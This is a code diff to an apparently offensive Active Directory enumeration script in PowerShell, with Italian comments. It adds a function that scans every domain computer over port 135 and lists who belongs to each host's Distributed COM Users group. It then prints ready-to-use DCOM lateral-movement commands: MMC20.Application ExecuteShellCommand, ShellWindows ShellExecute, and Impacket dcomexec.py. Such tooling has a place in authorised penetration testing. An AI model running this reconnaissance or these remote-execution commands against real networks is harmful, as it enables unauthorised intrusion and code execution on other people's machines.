@@ -1569,6 +1569,102 @@ function Get-DomainSessionsWMI {
     }
 }
 
+function Get-DCOMAccess {
+    Write-Banner "PERMESSI DCOM (ExecuteDCOM)"
+    
+    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
+    
+    Write-Section "Enumerazione membri 'Distributed COM Users' su computer"
+    Write-Info "Nota: Richiede accesso al gruppo locale via WinNT provider"
+    Write-Info "Chi ha questi permessi può eseguire codice remoto via DCOM"
+    Write-Host ""
+    
+    $dcomAccess = @{}
+    $computersWithDCOM = @()
+    
+    foreach ($computer in $computers) {
+        $hostname = $computer.Properties.dnshostname[0]
+        $name = $computer.Properties.name[0]
+        if (-not $hostname) { continue }
+        
+        # Test connettività prima
+        try {
+            $socket = New-Object System.Net.Sockets.TcpClient
+            $socket.Connect($hostname, 135)  # DCOM usa porta 135
+            $socket.Close()
+        }
+        catch {
+            Write-Host "    [*] $name - Non raggiungibile (porta 135)" -ForegroundColor DarkGray
+            continue
+        }
+        
+        try {
+            # Enumera membri del gruppo "Distributed COM Users"
+            $group = [ADSI]"WinNT://$hostname/Distributed COM Users,group"
+            $members = @($group.Invoke("Members")) | ForEach-Object { 
+                try {
+                    $_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null)
+                }
+                catch { $null }
+            } | Where-Object { $_ }
+            
+            if ($members.Count -gt 0) {
+                $computersWithDCOM += $name
+                Write-SubSection "$name ($hostname)"
+                
+                foreach ($member in $members) {
+                    Write-Finding "DCOM User" $member -Important
+                    
+                    if (-not $dcomAccess.ContainsKey($member)) {
+                        $dcomAccess[$member] = @()
+                    }
+                    $dcomAccess[$member] += $name
+                }
+            }
+            else {
+                Write-Host "    [*] $name - Nessun membro custom in Distributed COM Users" -ForegroundColor DarkGray
+            }
+        }
+        catch [System.Runtime.InteropServices.COMException] {
+            Write-Host "    [*] $name - Accesso negato al gruppo locale" -ForegroundColor DarkGray
+        }
+        catch {
+            Write-Host "    [*] $name - Errore: $($_.Exception.Message)" -ForegroundColor DarkGray
+        }
+    }
+    
+    # Riepilogo per utente
+    if ($dcomAccess.Count -gt 0) {
+        Write-Section "RIEPILOGO DCOM ACCESS PER UTENTE/GRUPPO"
+        
+        foreach ($principal in $dcomAccess.Keys) {
+            Write-Warning "$principal ha ExecuteDCOM su:"
+            foreach ($comp in $dcomAccess[$principal]) {
+                Write-Finding "Computer" $comp
+            }
+            Write-Host ""
+        }
+        
+        Write-Section "ATTACCHI DCOM"
+        Write-Info "Se hai credenziali di un utente con DCOM access, puoi eseguire codice:"
+        Write-Host ""
+        Write-Host "        # PowerShell - MMC20.Application" -ForegroundColor Yellow
+        Write-Host '        $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))' -ForegroundColor Gray
+        Write-Host '        $com.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c whoami > C:\test.txt", "7")' -ForegroundColor Gray
+        Write-Host ""
+        Write-Host "        # PowerShell - ShellWindows" -ForegroundColor Yellow
+        Write-Host '        $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET"))' -ForegroundColor Gray
+        Write-Host '        $com.Item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)' -ForegroundColor Gray
+        Write-Host ""
+        Write-Host "        # Impacket - dcomexec.py" -ForegroundColor Yellow
+        Write-Host '        dcomexec.py domain/user:password@TARGET' -ForegroundColor Gray
+        Write-Host ""
+    } else {
+        Write-Info "Nessun utente/gruppo custom trovato in 'Distributed COM Users'"
+        Write-Info "Nota: Local Admins hanno sempre accesso DCOM implicitamente"
+    }
+}
+
 #endregion
 
 #region Main Function
@@ -1601,6 +1697,7 @@ function Invoke-ADEnum {
         Get-LocalAdminAccess
         Get-DomainLoggedOnUsers
         Get-DomainSessionsWMI
+        Get-DCOMAccess
     }
     
     # Riepilogo finale
